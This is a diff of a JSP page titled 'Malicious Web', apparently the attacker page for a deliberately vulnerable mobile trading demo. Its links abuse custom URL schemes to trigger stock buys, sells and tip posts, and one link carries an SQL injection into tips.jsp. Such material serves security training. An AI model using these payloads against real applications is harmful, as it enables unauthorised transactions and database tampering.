@@ -1,59 +1,76 @@
-<!DOCTYPE html>
+<%--
+  Created by IntelliJ IDEA.
+  User: denimgroup
+  Date: 7/1/13
+  Time: 12:57 PM
+  To change this template use File | Settings | File Templates.
+--%>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%@ page import="JSON.JSONObject" %>
+<%@ page import="services.initDatabase" %>
+
+<%
+    response.setHeader("Cache-Control", "no-cache"); //HTTP 1.1
+    response.setHeader("Pragma", "no-cache"); //HTTP 1.0
+    response.setDateHeader("Expires", 0); //prevent caching at the proxy server
+%>
+
 <html>
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>Malicious Web</title>
-    <style type="text/css">
-        input[type=text], input[type=url], input[type=email], input[type=password], input[type=tel] {
-            -webkit-appearance: none; -moz-appearance: none;
-            display: block;
-            margin: 0;
-            width: 100%; height: 40px;
-            line-height: 40px; font-size: 17px;
-            border: 1px solid #bbb;
-        }
-        button[type=submit] {
-            -webkit-appearance: none; -moz-appearance: none;
-            display: block;
-            margin: 0.5em 0;
-            font-size: 1em; line-height: 2.5em;
-            color: #333;
-            font-weight: bold;
-            height: 2.5em; width: 100%;
-            background: #fdfdfd; background: -moz-linear-gradient(top, #fdfdfd 0%, #bebebe 100%); background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#fdfdfd), color-stop(100%,#bebebe)); background: -webkit-linear-gradient(top, #fdfdfd 0%,#bebebe 100%); background: -o-linear-gradient(top, #fdfdfd 0%,#bebebe 100%); background: -ms-linear-gradient(top, #fdfdfd 0%,#bebebe 100%); background: linear-gradient(to bottom, #fdfdfd 0%,#bebebe 100%);
-            border: 1px solid #bbb;
-            -webkit-border-radius: 10px; -moz-border-radius: 10px; border-radius: 10px;
-        }
 
-        body {
-            font-family: Helvetica, arial, sans-serif;
-        }
-        .congrats {
-            font-size: 16pt;
-            padding: 6px;
-            text-align: center;
-        }
-        .step {
-            background: white;
-            border: 1px #ccc solid;
-            border-radius: 14px;
-            padding: 4px 10px;
-            margin: 10px 0;
-        }
-        .instructions {
-            font-size: 10pt;
-        }
-        .arrow {
-            font-size: 15pt;
-        }
-
-    </style>
-
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="author" content="Jake Rocheleau">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="HandheldFriendly" content="true">
+    <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
+    <link rel="stylesheet" type="text/css" href="../web/styles.css">
+    <script type="text/javascript" src="http://code.jquery.com/jquery.min.js"></script>
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <script src="http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js"></script>
+    <![endif]-->
 
 </head>
 <body>
+<div id="view">
+    <header>
+        <h1>Malicious Web</h1>
+    </header>
 
+    <div id="container">
+        <ul>
+            <a href="trade://buy?symbol=GOOG&shares=10"><li class="clearfix">
+                <h2>Buy Stock</h2>
+                <p class="desc">Purchase stock through use of schema exploit  </p>
+            </li></a>
+            <a href="trade://sell?symbol=GOOG&shares=10'"><li class="clearfix">
+                <h2>Sell Stock</h2>
+                <p class="desc">Sell stock through use of schema exploit </p>
+            </li></a>
+            <a href="tips://share?symbol=GOOG&reason=all your tips belong to me"><li class="clearfix">
+                <h2>Add Tips</h2>
+                <p class="desc">Add malicious tip </p>
+            </li></a>
+            <a href="http://localhost:8080/web/tips.jsp?query=insert%20into%20version%28log%29%20values%28%27l337%20h4x0R%27%29"><li class="clearfix">
+                <h2>Update App</h2>
+                <p class="desc">Update to malicious version of Pandemobium </p>
+            </li></a>
+        </ul>
+    </div>
+</div>
+<script type="text/javascript">
+    $(document).ready(function(){
+        $("a").on("click", function(e){
+
+        });
+    });
+</script>
+</body>
+
+</html>
+
+<%--
 <div class="newUser">
     <h1 align="center"> Malicious Web</h1>
     <button type=submit name="buy" onclick="window.location='trade://buy?symbol=GOOG&shares=10';"> Buy Stock </button>
@@ -63,4 +80,4 @@
 </div>
 
 </body>
-</html>
+</html>--%>
